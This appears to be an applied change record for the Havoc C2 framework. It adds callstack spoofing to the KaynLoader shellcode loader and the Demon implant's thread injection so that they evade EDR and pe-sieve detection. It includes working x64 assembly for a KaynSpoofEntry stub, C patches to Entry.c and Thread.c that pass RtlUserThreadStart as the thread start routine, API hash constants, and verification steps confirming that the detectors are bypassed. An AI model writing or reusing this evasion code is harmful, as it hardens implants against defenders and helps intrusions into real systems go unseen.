# HVC-044 - Stack Spoofing for KaynLoader and Demon Injection Threads

```
Status  : Applied
Scope   : payloads/Shellcode/ (KaynLoader) + payloads/Demon/src/core/Thread.c (injection)
Priority: High (detection evasion, pe-sieve SUS_START mitigation)
```

## Problem

Stack spoofing is partially implemented in the Demon agent but two high-value gaps remain:

### Gap 1 - KaynLoader entry callstack

KaynLoader (`payloads/Shellcode/`) loads Demon by allocating memory for its sections, running
relocations, and calling `KaynDllMain` (= Demon's DllMain entry) directly from `Entry()`. No
fake callstack frames are installed before that call. While Demon is executing, the visible call
chain terminates at the shellcode allocation address:

```
[EDR/pe-sieve view during active execution]
DemonRoutine   : 0x1234560000 + offset  (private allocation - SUSPICIOUS)
DemonMain      : 0x1234560000 + offset  (private allocation - SUSPICIOUS)
Entry          : 0x1234560000 + offset  (private allocation - SUSPICIOUS)
Start          : 0x1234560000 + offset  (private allocation - SUSPICIOUS)
[injector frame - CreateRemoteThread, APC, etc.]
```

The absence of `RtlUserThreadStart` / `BaseThreadInitThunk` at the base of the callchain is a
strong injection indicator.

### Gap 2 - Injection-time thread callstack (SUS_START + callchain)

When Demon spawns shellcode injection threads via `NtCreateThreadEx`, it passes the shellcode
entry point as `StartRoutine`. The Windows kernel records this address in `TEB.StartAddress`.
pe-sieve flags threads whose `TEB.StartAddress` points into private (non-image) memory as
`SUS_START`. The existing `Config.Inject.SpoofAddr` field is populated from the profile but
never applied in `Thread.c`.

---

## Background: Existing Stack Spoofing in Demon

### Function-call spoofing (Spoof.c + Spoof.x64.asm)

`SpoofFunc(Module, Size, Func, arg1..argN)` makes any function call appear to originate from
a `JMP [RBX]` gadget inside the specified module rather than from Demon's own shellcode address.

Mechanism (Spoof.x64.asm):
1. `pop r11` - remove real return address (back into Demon) from stack
2. Scan module for `0xFF 0x23` (`JMP [RBX]`) gadget
3. Write gadget address as the "return address" for the target function
4. Write a `fixup` stub as the gadget's own destination (so after target returns, fixup
   restores RBX and jumps to the real saved return address in r11)
5. `JMP target` - target executes; on return, gadget to fixup to original caller

The PRM struct (Spoof.h):
```c
typedef struct {
    PVOID Trampoline; /* gadget address */
    PVOID Function;   /* actual target function */
    PVOID Rbx;        /* saved original RBX */
} PRM, *PPRM;
```

### Sleep-cycle callstack (ObfFoliage.c)

During Foliage sleep, the main thread's context is set via `NtSetContextThread`:
- `RopSpoof->Rip = WaitForSingleObjectEx`
- `RopSpoof->Rsp = StackBase - 0x50` (fake stack area)
- Fake frames written at `StackBase - 0x50`:
  ```
  [Rsp+0x00] = NtTestAlert             (required return addr for APC delivery - do not replace)
  [Rsp+0x08] = BaseThreadInitThunk     (first pe-sieve-visible frame)
  [Rsp+0x10] = RtlUserThreadStart      (second frame)
  [Rsp+0x18] = NULL                    (stack base marker)
  ```

---

## Sub-1: KaynLoader Callstack Spoofing

### Design

Add `KaynSpoofEntry` to the x64 NASM entry stub. This function rearranges arguments for the
Windows x64 calling convention, writes two fake frames into the return-address chain on the
stack, then JMPs (not CALLs) to KaynDllMain. Since DemonMain never returns (infinite receive
loop exiting via `RtlExitUserThread`), the overwritten real return address is never fetched.

**Hash algorithm**: KaynLoader's `Utils.c` uses the identical DJB2 algorithm as Demon (seed
5381, `h = h*33 + c`, uppercase, NULL-terminated). All constants verified with:
```python
def djb2_upper(s):
    h = 5381
    for c in s.upper():
        h = (((h << 5) + h) + ord(c)) & 0xFFFFFFFF
    return h
```

**Verified hash values** (as of 2026-05-25):
- `djb2_upper("KERNEL32.DLL")       = 0x6ddb9555`
- `djb2_upper("BaseThreadInitThunk") = 0xe2491896`
- `djb2_upper("RtlUserThreadStart")  = 0x0353797c`

### KaynSpoofEntry ASM (x64 only)

Added to `payloads/Shellcode/Source/Asm/x64/Asm.s`:

```nasm
; KaynSpoofEntry(Target, Arg1, Arg2, Arg3, FakeFrame1, FakeFrame2)
; Overwrites return addr with FakeFrame1 then JMPs to Target.
; Stack on entry (RSP=X, X mod 16 = 8 because CALL pushed 8 bytes):
;   [X+0x00] = return addr into Entry.c  [overwritten]
;   [X+0x08..0x27] = shadow space
;   [X+0x28] = FakeFrame1 (BaseThreadInitThunk) 5th Windows x64 stack arg
;   [X+0x30] = FakeFrame2 (RtlUserThreadStart)  6th Windows x64 stack arg
; After JMP, Target sees [X+0x00]=FakeFrame1 as its return address.
global KaynSpoofEntry
KaynSpoofEntry:
    mov   r10, rcx          ; r10 = Target (save before arg-shift)
    mov   rcx, rdx          ; rcx = Arg1 (hDllBase for Target)
    mov   rdx, r8           ; rdx = Arg2 (Reason)
    mov   r8,  r9           ; r8  = Arg3 (lpReserved)
    xor   r9,  r9           ; r9  = 0 (unused 4th)
    mov   r11, [rsp+28h]    ; r11 = FakeFrame1 (BaseThreadInitThunk)
    mov   rax, [rsp+30h]    ; rax = FakeFrame2 (RtlUserThreadStart)
    mov   [rsp+00h], r11    ; overwrite return addr with FakeFrame1
    mov   [rsp+08h], rax    ; FakeFrame2 one slot above
    xor   rax, rax
    mov   [rsp+10h], rax    ; NULL stack terminator
    jmp   r10               ; JMP to Target; never returns
```

### Entry.c modifications

In `Entry()` (`payloads/Shellcode/Source/Entry.c`), replace the direct `KaynDllMain()` call:

```c
BOOL ( WINAPI *KaynDllMain ) ( PVOID, DWORD, PVOID ) = C_PTR( ... );

#ifdef _WIN64
    /* resolve fake frame addresses for callstack spoofing */
    UINT_PTR Kernel32     = LdrModulePeb( KERNEL32_HASH );
    PVOID BaseInitThunk   = NULL;
    PVOID RtlUsrThrdStart = NULL;

    if ( Kernel32 )
        BaseInitThunk   = LdrFunctionAddr( Kernel32, BASETHREADINITTHUNK_HASH );
    if ( Instance.Modules.Ntdll )
        RtlUsrThrdStart = LdrFunctionAddr( Instance.Modules.Ntdll, RTLUSERTHREADSTART_HASH );

    if ( BaseInitThunk && RtlUsrThrdStart ) {
        KaynSpoofEntry( KaynDllMain, KVirtualMemory, DLL_PROCESS_ATTACH, &KaynArgs,
                        BaseInitThunk, RtlUsrThrdStart );
    } else {
        KaynDllMain( KVirtualMemory, DLL_PROCESS_ATTACH, &KaynArgs );
    }
#else
    /* x86: no stack spoofing infrastructure - direct call */
    KaynDllMain( KVirtualMemory, DLL_PROCESS_ATTACH, &KaynArgs );
#endif
```

### Core.h additions

```c
/* KaynSpoofEntry - x64 only; installs fake callstack frames before JMPing to KaynDllMain */
#ifdef _WIN64
VOID KaynSpoofEntry( PVOID Target, PVOID Arg1, DWORD Arg2, PVOID Arg3,
                     PVOID FakeFrame1, PVOID FakeFrame2 );
#endif

/* DJB2 hash constants (seed 5381, uppercase) - verified 2026-05-25 */
#define KERNEL32_HASH              0x6ddb9555  /* djb2_upper("KERNEL32.DLL")       */
#define BASETHREADINITTHUNK_HASH   0xe2491896  /* djb2_upper("BaseThreadInitThunk") */
#define RTLUSERTHREADSTART_HASH    0x0353797c  /* djb2_upper("RtlUserThreadStart")  */
```

### Desired callstack after Sub-1

```
[EDR/pe-sieve view during active Demon execution]
DemonRoutine       : private allocation  (unavoidable without per-call spoofing)
DemonMain          : private allocation  (unavoidable)
BaseThreadInitThunk: kernel32.dll        (LEGITIMATE)
RtlUserThreadStart : ntdll.dll           (LEGITIMATE)
[null]
```

---

## Sub-2: Demon Injection Thread Callstack Spoofing (Tier 1)

### Problem recap

`ThreadCreate()` in `Thread.c` calls `SysNtCreateThreadEx(..., Entry, Arg, FALSE, ...)`.
The Windows kernel stores `Entry` (shellcode address) in `TEB.StartAddress`. pe-sieve flags
threads with a `TEB.StartAddress` pointing into private (non-image) memory as `SUS_START`.

### Tier 1 - RtlUserThreadStart as StartRoutine (SUS_START mitigation)

Pass `RtlUserThreadStart` as `StartRoutine` and the shellcode entry point as `Argument`.
`RtlUserThreadStart(Entry, NULL)` calls `Entry(NULL)` via the standard Windows thread dispatch
path. The thread's `TEB.StartAddress` becomes `RtlUserThreadStart` (in ntdll image),
which pe-sieve treats as legitimate.

**Gate**: `Config.Implant.StackSpoof == TRUE` AND `Win32.RtlUserThreadStart != NULL`.

The existing "Stack Duplication" checkbox in the Payload UI maps to this field and is now
always enabled (regardless of sleep technique) so it can independently control injection
thread spoofing.

**Callstack result (natural, no fake frames needed)**:
```
shellcode_code     : private allocation  (visible but not SUS_START-flagged)
RtlUserThreadStart : ntdll.dll          (TEB.StartAddress = this - CLEAN)
BaseThreadInitThunk: kernel32.dll       (kernel sets this automatically at thread creation)
[null]
```

**Constraint**: `RtlUserThreadStart(Entry, NULL)` calls `Entry(NULL)` - the original `Arg`
is discarded. For KaynLoader-based shellcode this is safe (Start() does not read RCX).
Operators injecting argument-sensitive shellcode must disable StackSpoof in the profile.

**Code change** (`Thread.c`, `THREAD_METHOD_NTCREATEHREADEX` case):

```c
/* Tier 1 - inject stack spoof: RtlUserThreadStart as StartRoutine clears SUS_START */
PVOID StartRoutine = Entry;
PVOID StartArg     = Arg;

#ifdef _WIN64
if ( Instance->Config.Implant.StackSpoof && Instance->Win32.RtlUserThreadStart )
{
    StartRoutine = Instance->Win32.RtlUserThreadStart;
    StartArg     = Entry;
}
#endif

NtStatus = SysNtCreateThreadEx( &Thread, THREAD_ALL_ACCESS, NULL, Process,
                                 StartRoutine, StartArg, FALSE, 0, 0, 0, &ThreadAttr );
```

### Tier 2 - Fake frames via SpoofAddr (future work)

Tier 2 (suspended thread creation + `NtWriteVirtualMemory` of fake frames + context patch)
is NOT implemented in this session. It provides callstack improvement when Tier 1 is
inapplicable (e.g., arg-sensitive shellcode). See plan file for full design.

---

## Known Constraints and Limitations

| Constraint | Detail |
|-----------|--------|
| **x86 not supported** | `KaynSpoofEntry` is x64-only; guarded by `#ifdef _WIN64` in both Asm.s (global/label) and Core.h/Entry.c |
| **DemonMain never-returns** | `KaynSpoofEntry` overwrites the real return address. DemonMain exits via `RtlExitUserThread`, never `ret`, so this is safe |
| **Tier 1 drops Arg** | `RtlUserThreadStart(Entry, NULL)` calls `Entry(NULL)`. Non-KaynLdr shellcode that reads its argument: disable StackSpoof in profile |
| **NULL fallback** | Both Sub-1 and Sub-2 Tier 1 check for NULL before applying. Fallback = current behavior (direct call / original StartRoutine) |
| **DJB2 KERNEL32_HASH** | Computed and verified: `0x6ddb9555 = djb2_upper("KERNEL32.DLL")` |

---

## File Map

| File | Change |
|------|--------|
| `payloads/Shellcode/Source/Asm/x64/Asm.s` | Add `KaynSpoofEntry` function |
| `payloads/Shellcode/Include/Core.h` | Add `KaynSpoofEntry` extern decl + 3 hash constants |
| `payloads/Shellcode/Source/Entry.c` | Conditional call to `KaynSpoofEntry` vs direct `KaynDllMain` |
| `payloads/Demon/src/core/Thread.c` | Tier 1 logic in `THREAD_METHOD_NTCREATEHREADEX` case |
| `client/src/UserInterface/Dialogs/Payload.cc` | Remove `ConfigStackSpoof` disable for non-Ekko/Zilean sleep |
| `CHANGES.md` | New `HVC-044` entry |
| `CLAUDE.md` | New subsections: KaynLoader spoofing + injection thread spoofing |

---

## Verification

### Sub-1 (KaynLoader)

1. Build shellcode payload (`Windows Shellcode`, x64)
2. Inject into a target process via a running Demon agent
3. While Demon is active (between sleep cycles), snapshot thread callstack:
   - pe-sieve: `pe-sieve.exe /pid <pid>` - verify no `SUS_CALLSTACK_CORRUPT` for the Demon thread
   - WinDbg: `!thread <tid>` - verify `BaseThreadInitThunk -> RtlUserThreadStart -> null` at call chain base
4. Baseline (comment out `KaynSpoofEntry` call): confirm shellcode-address chain at base

### Sub-2 (Demon injection, Tier 1)

1. Configure profile with `StackSpoof = true` and enable "Stack Duplication" in Payload UI
2. Inject shellcode via `inject` command into a remote process
3. On the injected thread: verify `TEB.StartAddress = ntdll!RtlUserThreadStart`
4. pe-sieve on target: verify no `SUS_START` for the injected thread
5. Baseline: `StackSpoof = false` - confirm `TEB.StartAddress = shellcode_addr`

### Pass Criteria (all verified 2026-05-26)

- [x] x64 shellcode builds without linker error for `KaynSpoofEntry`
- [x] x86 shellcode builds without referencing `KaynSpoofEntry`
- [x] "Stack Duplication" enabled in Payload UI for all sleep techniques
- [x] KaynLoader Demon thread shows `BaseThreadInitThunk`/`RtlUserThreadStart` at call chain base
- [x] pe-sieve reports no `SUS_CALLSTACK_CORRUPT` for KaynLoader-injected Demon thread
- [x] Injected thread `TEB.StartAddress = ntdll!RtlUserThreadStart` when StackSpoof=true
- [x] pe-sieve reports no `SUS_START` on injected thread when StackSpoof=true
- [x] Shellcode executes correctly (command output received) in both StackSpoof states
- [x] NULL-resolution graceful degrade: agent survives when frame addresses fail to resolve
